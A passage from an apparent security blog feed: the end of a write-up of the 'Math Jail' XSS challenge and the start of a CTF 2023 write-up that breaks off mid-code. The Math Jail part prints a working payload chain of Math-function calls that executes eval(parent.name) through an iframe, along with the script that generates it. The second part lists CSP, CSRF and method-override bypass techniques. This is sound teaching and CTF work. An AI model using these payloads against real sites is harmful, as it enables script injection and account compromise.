punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>eval(parent.name)</code> is the shortest payload I could find. The second shortest is <code>location=parent.name</code>.</p><h3><span id="empty-mathseeds">Empty Math.seeds</span></h3><p>Previously, <code>Math.seeds.pop()</code> was used to clear the content, but this part can be further shortened!</p><p>@y0d3n introduced a technique: <code>Math.seeds.splice(Math.imul())</code>.</p><p>This works because the return value of <code>Math.imul()</code> is 0, and <code>splice(0)</code> means “remove data after(and include) the first element.” Therefore, the entire array is cleared.</p><h3><span id="get-an-empty-string">Get an empty string</span></h3><p>Previously, I used a more convoluted method to generate an empty string. Later, I discovered that <code>Math.random.name</code> could yield an empty string.</p><p>This is due to this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span><span class="token function-variable function">random</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.62536</span><span class="token punctuation">,</span> <span class="token number">0.458483</span><span class="token punctuation">,</span> <span class="token number">0.544523</span><span class="token punctuation">,</span> <span class="token number">0.323421</span><span class="token punctuation">,</span> <span class="token number">0.775465</span><span class="token punctuation">]</span>    next <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>length<span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span>  next <span class="token operator">=</span> next <span class="token operator">*</span> <span class="token number">1103515245</span> <span class="token operator">+</span> <span class="token number">12345</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>next <span class="token operator">/</span> <span class="token number">65536</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">32767</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Notice there’s no name after <code>function</code>, making it an anonymous function. So, we’re assigning an anonymous function to <code>Math.random</code>, hence <code>Math.random.name</code> becomes an empty string.</p><h3><span id="obtaining-fixed-numbers">Obtaining fixed numbers</span></h3><p>I previously used built-in constants like <code>Math.PI</code> to obtain fixed numbers. Later, I learned from @Astrid that we can use forms like <code>STRING.length.valueOf()</code> to get numbers.</p><p>For example, <code>Math.isPrototypeOf.name.length.valueOf()</code> would yield 13. Using this method, we can quickly obtain a fixed number.</p><p>Once we have a fixed number, we can find our desired number with fewer steps, and @Astrid even wrote code to find the shortest path.</p><h3><span id="final-solution">Final solution</span></h3><p>The resulting payload is composed of 59 operations and executes <code>eval(parent.name)</code>(this requires collaboration with the previously mentioned iframe to run).</p><pre class="line-numbers language-none"><code class="language-none">Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The script is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token parameter">arrName<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> currentIndex <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> codeResult <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment">// @credit: @y0d3n</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.imul'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.seeds.splice'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>      <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math.abs.name.constructor'</span><span class="token punctuation">)</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>    <span class="token comment">// if we can find it in the Math for the current index, use it</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>      <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>      <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>      <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span>    <span class="token punctuation">]</span>    <span class="token comment">// try to find Math.fn[i] == char</span>    <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>mapping<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'v'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token string">'Math.LN2.valueOf'</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>mapping<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        currentIndex<span class="token operator">++</span>        found <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @credit: @Astrid</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'('</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.isPrototypeOf.name.length.valueOf'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.log2'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.acosh'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> mathResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      mathResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> mathResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// add eval structure</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.random.name.valueOf'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.join</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor.prototype.call.call'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ans<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    codeResult <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>codeResult<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">// @credit: @DrBrix</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token string">'Math.seeds'</span><span class="token punctuation">,</span> <span class="token string">'eval(parent.name)'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Perhaps there might be something even shorter, but I’m too lazy to search for it.</p><h2><span id="conclusion">Conclusion</span></h2><p>The above is the solution to the challenge and the thought process behind it.</p><p>Originally, the ideal situation was to find a usable array directly from Math, without needing <code>Math.seeds</code>. However, upon trying, it seems I couldn’t find such a solution.</p><p>I’ve also learned a lot from other hackers’ solutions, like clearing the array or achieving even shorter payloads, things I didn’t anticipate when designing the challenge. Kudos to all the hackers!</p><p>I hope that everyone has learned something from this challenge and had a great time participating.</p><p>Thank you all for your participation, and I look forward to crossing paths again in future challenges!</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;In the monthly challenges at Intigriti, I presented an XSS challenge that I named “Math Jail.” You can find the challenge at the following link: &lt;a href=&quot;https://challenge-0823.intigriti.io/&quot;&gt;https://challenge-0823.intigriti.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now that the challenge has concluded, I’d like to take this opportunity to discuss the thought process behind creating the challenge and share some of the solutions that were developed.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 Writeup</title>
    <link href="https://blog.huli.tw/2023/07/28/en/google-zer0pts-imaginary-ctf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/07/28/en/google-zer0pts-imaginary-ctf-2023-writeup/</id>
    <published>2023-07-28T06:10:44.000Z</published>
    <updated>2023-07-29T12:30:21.520Z</updated>
    
    <content type="html"><![CDATA[<p>A while ago, I was busy traveling and didn’t have much time for CTFs. Even if I did participate, I was too lazy to write a writeup, so my last writeup was back in March. I felt it was a shame to break the streak, so I quickly wrote another one to make up for it.</p><p>Regarding the three CTFs mentioned in the title, I only participated in GoogleCTF 2023. For the other two events, I only briefly looked at the challenges, so this post will only serve as a note on the challenges and their solutions.</p><p>Keyword list:</p><ol><li>Inconsistent order of POST data parsing between Flask and PHP</li><li>iframe CSP blocking certain script loads</li><li>CSRF bypass using HEAD method</li><li>Accessing parent origin using <code>location.ancestorOrigins</code></li><li>Changing iframe location doesn’t affect the src</li><li>Angular CSP bypass gadget in recaptcha URL</li><li>Restoring input using <code>document.execCommand(&#39;undo&#39;);</code></li><li>X-HTTP-Method-Override</li><li>Differences between HTML and XHTML parsers</li></ol><span id="more"></span><h2><span id="googlectf-2023">GoogleCTF 2023</span></h2><p>Here is the complete official challenge content and solution: <a href="https://github.com/google/google-ctf/tree/master/2023">https://github.com/google/google-ctf/tree/master/2023</a></p><h3><span id="under-construction-466-solves">UNDER-CONSTRUCTION (466 solves)</span></h3><p>The core code for this challenge is as follows:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@authorized<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/signup'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">signup_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    raw_request <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    tier <span class="token operator">=</span> models<span class="token punctuation">.</span>Tier<span class="token 